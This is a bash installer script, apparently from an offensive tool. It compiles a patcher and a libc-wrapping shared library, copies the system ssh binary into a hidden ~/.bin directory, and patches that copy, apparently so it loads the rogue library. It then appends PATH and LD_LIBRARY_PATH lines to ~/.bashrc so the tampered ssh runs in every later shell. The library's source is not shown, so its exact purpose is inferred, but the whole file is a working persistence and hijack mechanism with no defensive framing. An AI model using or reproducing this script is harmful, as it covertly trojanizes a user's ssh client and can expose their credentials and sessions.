#!/bin/bash

cc -s -o dynamicorrupt dynamicorrupt.c
cc -s -shared  -fPIC c.so.6.c -o c.so.6 -ldl -DLIBC_PATH=$(ldd $(which ssh) | grep libc.so | awk '{print "\""$3"\""}')
xxd -plain dynamicorrupt | tr -d \\n > dynamicorrupt.hex
xxd -plain c.so.6 | tr -d \\n > c.so.6.hex
rm -rf $HOME/.bin
mkdir $HOME/.bin/
cp *.hex $HOME/.bin/
cp $(which ssh) $HOME/.bin/
./dynamicorrupt $HOME/.bin/ssh
cp c.so.6 $HOME/.bin/
echo "export PATH=$HOME/.bin:$PATH" >> $HOME/.bashrc
echo "export LD_LIBRARY_PATH=$HOME/.bin/" >> $HOME/.bashrc

export PATH=$HOME/.bin:$PATH
export LD_LIBRARY_PATH=$HOME/.bin/

